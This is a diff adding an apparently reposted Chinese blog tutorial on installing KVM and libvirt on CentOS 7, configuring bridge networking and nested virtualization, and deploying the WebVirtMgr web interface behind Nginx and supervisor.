+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix_sock_group = &quot;libvirt&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>为R&#x2F;W套接字设置UNIX套接字权限（第102行附近）</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unix_sock_rw_perms = &quot;0770&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>将当前用户帐户添加到libvirt组</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -a -G libvirt $(whoami)</span><br><span class="line">newgrp libvirt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>重新启动libvirt守护进程。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl restart libvirtd.service</span><br></pre></td></tr></table></figure>
+
+<h1 id="启用嵌套虚拟化（可选）"><a href="#启用嵌套虚拟化（可选）" class="headerlink" title="启用嵌套虚拟化（可选）"></a>启用嵌套虚拟化（可选）</h1><ul>
+<li>嵌套虚拟化就是在虚拟机中运行虚拟机。<br>如图所示，通过启用内核模块为kvm_intel &#x2F; kvm_amd启用嵌套虚拟化。</li>
+</ul>
+<p>一般不会这样搞。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## Intel Processor ###</span></span></span><br><span class="line">sudo modprobe -r kvm_intel</span><br><span class="line">sudo modprobe kvm_intel nested=1</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## AMD Processor ###</span></span></span><br><span class="line">sudo modprobe -r kvm_amd</span><br><span class="line">sudo modprobe kvm_amd nested=1</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>要使此配置持久化，请运行：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;options kvm-intel nested=1&quot; | sudo tee /etc/modprobe.d/kvm-intel.conf</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>确认“嵌套虚拟化”设置为“yes”：</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Intel Processor ###</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">systool -m kvm_intel -v | grep nested</span></span><br><span class="line">    nested              = &quot;Y&quot;</span><br><span class="line">    nested_early_check  = &quot;N&quot;</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /sys/module/kvm_intel/parameters/nested</span> </span><br><span class="line">Y</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment">## AMD Processor ###</span></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">systool -m kvm_amd -v | grep nested</span></span><br><span class="line">    nested              = &quot;Y&quot;</span><br><span class="line">    nested_early_check  = &quot;N&quot;</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /sys/module/kvm_amd/parameters/nested</span> </span><br><span class="line">Y</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="kvm介绍"><a href="#kvm介绍" class="headerlink" title="kvm介绍"></a>kvm介绍</h1><p>转载：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/nwnusun/p/16574336.html">KVM的基本使用 - 匿名者nwnu - 博客园 (cnblogs.com)</a></p>
+<p>虚拟化是云计算的基础。简单的说，虚拟化使得在一台物理的服务器上可以跑多台虚拟机，虚拟机共享物理机的 CPU、内存、IO 硬件资源，但逻辑上虚拟机之间是相互隔离的。</p>
+<p>物理机我们一般称为宿主机（Host），宿主机上面的虚拟机称为客户机（Guest）。</p>
+<p>那么 Host 是如何将自己的硬件资源虚拟化，并提供给 Guest 使用的呢？ 这个主要是通过一个叫做 Hypervisor 的程序实现的。</p>
+<p>根据 Hypervisor 的实现方式和所处的位置，虚拟化又分为两种：</p>
+<ul>
+<li>全虚拟化- 半虚拟化<br><strong>全虚拟化：</strong> Hypervisor 直接安装在物理机上，多个虚拟机在 Hypervisor 上运行。Hypervisor 实现方式一般是一个特殊定制的 Linux 系统。Xen 和 VMWare 的 ESXi 都属于这个类型</li>
+</ul>
+<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314132441934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314132441934.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a> <strong>半虚拟化：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314132539401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314132539401.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a></p>
+<p><strong>理论上讲：</strong></p>
+<p>全虚拟化一般对硬件虚拟化功能进行了特别优化，性能上比半虚拟化要高； 半虚拟化因为基于普通的操作系统，会比较灵活，比如支持虚拟机嵌套。<strong>嵌套意味着可以在KVM虚拟机中再运行KVM。</strong></p>
+<p>*<strong>2*</strong>|***0***<strong>2. kvm介绍</strong></p>
+<p>kVM 全称是 Kernel-Based Virtual Machine。也就是说 KVM 是基于 Linux 内核实现的。 KVM有一个内核模块叫 kvm.ko，只用于管理虚拟 CPU 和内存。</p>
+<p>那 IO 的虚拟化，比如存储和网络设备则是由 Linux 内核与Qemu来实现。</p>
+<p>作为一个 Hypervisor，KVM 本身只关注虚拟机调度和内存管理这两个方面。IO 外设的任务交给 Linux 内核和 Qemu。</p>
+<p>大家在网上看 KVM 相关文章的时候肯定经常会看到 Libvirt 这个东西。</p>
+<p>Libvirt 就是 KVM 的管理工具。</p>
+<p>其实，Libvirt 除了能管理 KVM 这种 Hypervisor，还能管理 Xen，VirtualBox 等。</p>
+<p>Libvirt 包含 3 个东西：后台 daemon 程序 libvirtd、API 库和命令行工具 virsh</p>
+<ul>
+<li>libvirtd是服务程序，接收和处理 API 请求；</li>
+<li>API 库使得其他人可以开发基于 Libvirt 的高级工具，比如 virt-manager，这是个图形化的 KVM 管理工具；</li>
+<li>virsh 是我们经常要用的 KVM 命令行工具</li>
+</ul>
+<p>*<strong>3*</strong>|***0***<strong>3. kvm部署</strong></p>
+<p><strong>环境说明：</strong></p>
+<p>IP：192.168.157.99</p>
+<p>*<strong>3*</strong>|***1***<strong>3.1 kvm安装</strong></p>
+<p>部署前请确保你的CPU虚拟化功能已开启。分为两种情况：</p>
+<ul>
+<li>虚拟机要关机设置CPU虚拟化- 物理机要在BIOS里开启CPU虚拟化<br><strong>&#x2F;&#x2F;关闭防火墙与selinux</strong></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">setenforce 0</span><br><span class="line">sed -ri &#x27;s/^(SELINUX=).*/\1disabled/g&#x27; /etc/selinux/config</span><br><span class="line">//这一步十分重要！！！</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;&#x2F;配置网络源</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br><span class="line">wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo</span><br><span class="line">yum makecache</span><br><span class="line">yum -y install epel-release vim wget net-tools unzip zip gcc gcc-c++</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;&#x2F;验证CPU是否支持KVM；如果结果中有vmx（Intel）或svm(AMD)字样，就说明CPU的支持的</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">egrep -o &#x27;vmx|svm&#x27; /proc/cpuinfo</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;&#x2F;安装KVM依赖包及管理工具</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># kvm属于内核态，不需要安装。但是需要一些管理工具包</span><br><span class="line">yum install -y qemu-kvm libvirt libvirt-python libguestfs-tools virt-install virt-manager python-virtinst libvirt-client virt-viewer qemu-kvm-tool</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;&#x2F;因为虚拟机中网络，我们一般都是和公司的其他服务器是同一个网段，所以我们需要把 KVM服务器的网卡配置成桥接模式。这样的话KVM的虚拟机就可以通过该桥接网卡和公司内部 其他服务器处于同一网段</strong></p>
+<p><strong>&#x2F;&#x2F;此处我的网卡是ens32，所以用br0来桥接ens32网卡</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//对应修改或者添加以下内容即可</span><br><span class="line">[root@mp ~]# vim /etc/sysconfig/network-scripts/ifcfg-br0 </span><br><span class="line">TYPE=Bridge</span><br><span class="line">DEVICE=br0</span><br><span class="line">NM_CONTROLLED=no</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">NAME=br0</span><br><span class="line">ONBOOT=yes</span><br><span class="line">IPADDR=192.168.157.99</span><br><span class="line">NETMASK=255.255.255.0</span><br><span class="line">GATEWAY=192.168.157.2</span><br><span class="line">DNS1=8.8.8.8</span><br><span class="line"></span><br><span class="line">//保留以下内容即可</span><br><span class="line">[root@mp ~]# vim /etc/sysconfig/network-scripts/ifcfg-ens32 </span><br><span class="line">TYPE=Ethernet</span><br><span class="line">BOOTPROTO=static</span><br><span class="line">NAME=ens33</span><br><span class="line">DEVICE=ens33</span><br><span class="line">ONBOOT=yes</span><br><span class="line">BRIDGE=br0</span><br><span class="line">NM_CONTROLLED=no</span><br><span class="line">[root@mp ~]# systemctl restart network</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;&#x2F;启动服务</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl start libvirtd</span><br><span class="line">systemctl enable libvirtd</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;&#x2F;验证安装结果</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@mp ~]# lsmod|grep kvm</span><br><span class="line">kvm_intel             170086  0 </span><br><span class="line">kvm                   566340  1 kvm_intel</span><br><span class="line">irqbypass              13503  1 kvm</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;&#x2F;测试并验证安装结果</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@mp ~]# virsh -c qemu:///system list</span><br><span class="line"> Id    名称                         状态</span><br><span class="line">----------------------------------------------------</span><br><span class="line">[root@mp ~]# virsh --version</span><br><span class="line">4.5.0</span><br><span class="line">[root@mp ~]# virt-install --version</span><br><span class="line">1.5.0</span><br><span class="line">[root@mp ~]# ln -s /usr/libexec/qemu-kvm /usr/bin/qemu-kvm</span><br><span class="line">[root@mp ~]# ll /usr/bin/qemu-kvm </span><br><span class="line">lrwxrwxrwx. 1 root root 21 3月  14 14:17 /usr/bin/qemu-kvm -&amp;  /usr/libexec/qemu-kvm</span><br><span class="line">	</span><br><span class="line">[root@mp ~]# lsmod |grep kvm</span><br><span class="line">kvm_intel             170086  0 </span><br><span class="line">kvm                   566340  1 kvm_intel</span><br><span class="line">irqbypass              13503  1 kvm</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;&#x2F;查看网桥信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@mp ~]# brctl show</span><br><span class="line">bridge name	bridge id		STP enabled	interfaces</span><br><span class="line">br0		8000.000c2993a66c	no		ens32</span><br><span class="line">virbr0		8000.5254009df26a	yes		virbr0-nic</span><br></pre></td></tr></table></figure>
+
+<p>*<strong>3*</strong>|***2***<strong>3.2 kvm web管理界面安装</strong></p>
+<p>kvm 的 web 管理界面是由 webvirtmgr 程序提供的。</p>
+<p><strong>&#x2F;&#x2F;安装依赖包</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 管理端安装</span><br><span class="line">yum -y install git python-pip libvirt-python libxml2-python python-websockify supervisor gcc python-devel</span><br><span class="line"># 使用pip安装Python扩展程序库</span><br><span class="line">pip install numpy -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;&#x2F;升级pip</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;&#x2F;git克隆配置并运行WebVirMgr</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 创建data目录，将WebVirtMgr移动到data目录，同时创建KVM存储目录</span><br><span class="line">mkdir /data/kvm -pv</span><br><span class="line"># 克隆项目</span><br><span class="line">cd /data</span><br><span class="line">git clone git://github.com/retspen/webvirtmgr.git</span><br><span class="line">cd webvirtmgr</span><br><span class="line">pip install -r requirements.txt  -i http://pypi.douban.com/simple/ --trusted-host pypi.douban.com</span><br><span class="line"># 说明:requirements.txt主要是用于记录所有依赖包及其精确的版本号。以便新环境部署</span><br><span class="line"># 初始化环境</span><br><span class="line">./manage.py syncdb</span><br><span class="line">## 这里需要我们输入Yes，配置管理员用户</span><br><span class="line">配置信息如下</span><br><span class="line">Would you like to create one now? (yes/no): yes         #是否现在创建管理员用户</span><br><span class="line">Username (leave blank to use &#x27;root&#x27;): root              #用户名称</span><br><span class="line">Email address:                                          #邮箱地址 (可以不填)</span><br><span class="line">Password:                                               #管理员用户密码</span><br><span class="line">Password (again):                                       #重复输入密码</span><br><span class="line">Superuser created successfully.                         #创建成功</span><br><span class="line"># 配置Django 静态页面</span><br><span class="line">./manage.py collectstatic </span><br><span class="line">输入Yes即可</span><br><span class="line"># 如果还想继续添加管理员用户，可以执行下面的命令</span><br><span class="line">./manage.py createsuperuser</span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;&#x2F;<strong>启动WebVirMgr</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">前台启动WebVirMgr，默认是Debug模式同时日志打印在前台</span><br><span class="line">./manage.py runserver 0:8000</span><br></pre></td></tr></table></figure>
+
+<p>访问:<a target="_blank" rel="noopener" href="http://192.168.209.134:8000/">http://192.168.209.134:8000</a></p>
+<p><strong>&#x2F;&#x2F;安装Nginx</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">1.安装依赖</span><br><span class="line">yum install -y gcc glibc gcc-c++ prce-devel openssl-devel pcre-devel</span><br><span class="line">2.安装编译Nginx</span><br><span class="line">cd /root/</span><br><span class="line">wget http://nginx.org/download/nginx-1.16.1.tar.gz</span><br><span class="line">useradd -s /sbin/nologin nginx -M </span><br><span class="line">tar xf nginx-1.16.1.tar.gz &amp;&amp; cd nginx-1.16.1.tar.gz</span><br><span class="line">./configure --prefix=/usr/local/nginx-1.16.1 --user=nginx --group=nginx --with-http_ssl_module --with-http_stub_status_module</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">ln -s /usr/local/nginx-1.16.1 /usr/local/nginx</span><br><span class="line"># 修改配置文件</span><br><span class="line">cd /usr/local/nginx/conf</span><br><span class="line">vim nginx.conf</span><br><span class="line"></span><br><span class="line">worker_processes  1;</span><br><span class="line">user nginx;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  kvm.i4t.com;</span><br><span class="line">      </span><br><span class="line">        location / &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8000;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">		proxy_set_header X-Forwarded-for $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header Host $host:$server_port;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto $remote_addr;</span><br><span class="line">        proxy_connect_timeout 600;</span><br><span class="line">        proxy_read_timeout 600;</span><br><span class="line">        proxy_send_timeout 600;</span><br><span class="line">        client_max_body_size 5120M;</span><br><span class="line">          &#125;</span><br><span class="line">    location /static/ &#123;</span><br><span class="line">        root /data/webvirtmgr;</span><br><span class="line">        expires max;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"># 启动Nginx</span><br><span class="line">/usr/local/nginx/sbin/nginx -t</span><br><span class="line">/usr/local/nginx/sbin/nginx </span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;&#x2F;配置nginx</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">1.安装依赖</span><br><span class="line">yum install -y gcc glibc gcc-c++ prce-devel openssl-devel pcre-devel</span><br><span class="line">2.安装编译Nginx</span><br><span class="line">cd /root/</span><br><span class="line">wget http://nginx.org/download/nginx-1.16.1.tar.gz</span><br><span class="line">useradd -s /sbin/nologin nginx -M </span><br><span class="line">tar xf nginx-1.16.1.tar.gz &amp;&amp; cd nginx-1.16.1.tar.gz</span><br><span class="line">./configure --prefix=/usr/local/nginx-1.16.1 --user=nginx --group=nginx --with-http_ssl_module --with-http_stub_status_module</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">ln -s /usr/local/nginx-1.16.1 /usr/local/nginx</span><br><span class="line"># 修改配置文件</span><br><span class="line">cd /usr/local/nginx/conf</span><br><span class="line">vim nginx.conf</span><br><span class="line"></span><br><span class="line">worker_processes  1;</span><br><span class="line">user nginx;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  kvm.i4t.com;</span><br><span class="line">      </span><br><span class="line">        location / &#123;</span><br><span class="line">        proxy_pass http://127.0.0.1:8000;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">		proxy_set_header X-Forwarded-for $proxy_add_x_forwarded_for;</span><br><span class="line">        proxy_set_header Host $host:$server_port;</span><br><span class="line">        proxy_set_header X-Forwarded-Proto $remote_addr;</span><br><span class="line">        proxy_connect_timeout 600;</span><br><span class="line">        proxy_read_timeout 600;</span><br><span class="line">        proxy_send_timeout 600;</span><br><span class="line">        client_max_body_size 5120M;</span><br><span class="line">          &#125;</span><br><span class="line">    location /static/ &#123;</span><br><span class="line">        root /data/webvirtmgr;</span><br><span class="line">        expires max;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"># 启动Nginx</span><br><span class="line">/usr/local/nginx/sbin/nginx -t</span><br><span class="line">/usr/local/nginx/sbin/nginx </span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;&#x2F;创建supervisor配置文件</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">WebVirtMgr默认使用supervisor进行管理(启动停止服务)</span><br><span class="line"></span><br><span class="line">cat &gt; /etc/supervisord.d/webvirtmgr.ini &lt;&lt; EOF</span><br><span class="line">[program:webvirtmgr]</span><br><span class="line">command=/usr/bin/python /data/webvirtmgr/manage.py run_gunicorn -c /data/webvirtmgr/conf/gunicorn.conf.py</span><br><span class="line">directory=/data/webvirtmgr</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br><span class="line">logfile=/var/log/supervisor/webvirtmgr.log</span><br><span class="line">log_stderr=true</span><br><span class="line">user=root</span><br><span class="line"></span><br><span class="line">[program:webvirtmgr-console]</span><br><span class="line">command=/usr/bin/python /data/webvirtmgr/console/webvirtmgr-console</span><br><span class="line">directory=/data/webvirtmgr</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br><span class="line">stdout_logfile=/var/log/supervisor/webvirtmgr-console.log</span><br><span class="line">redirect_stderr=true</span><br><span class="line">user=root</span><br><span class="line">EOF</span><br><span class="line"># 启动</span><br><span class="line">systemctl start supervisord </span><br><span class="line">systemctl enable supervisord</span><br><span class="line"># 检查</span><br><span class="line">supervisorctl status</span><br><span class="line"># 重启所以（非执行）</span><br><span class="line">supervisorctl restart all</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x2F;&#x2F;重启nginx</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/nginx/sbin/nginx -s reload</span><br></pre></td></tr></table></figure>
+
+<p>*<strong>4*</strong>|***0***<strong>4. kvm web界面管理</strong></p>
+<p>通过ip地址在浏览器上访问kvm，例如我这里就是：</p>
+<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314192444173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314192444173.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a>此处的用户为：root 密码为：执行python manage syncdb时设置的超级管理员密码</p>
+<p><a target="_blank" rel="noopener" href="https://img-blog.csdnimg.cn/20190314193031866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70"><img src="https://img-blog.csdnimg.cn/20190314193031866.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzY5NTEwNA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></a>此处的Label要与下面的FQDN &#x2F; IP一致！</p>
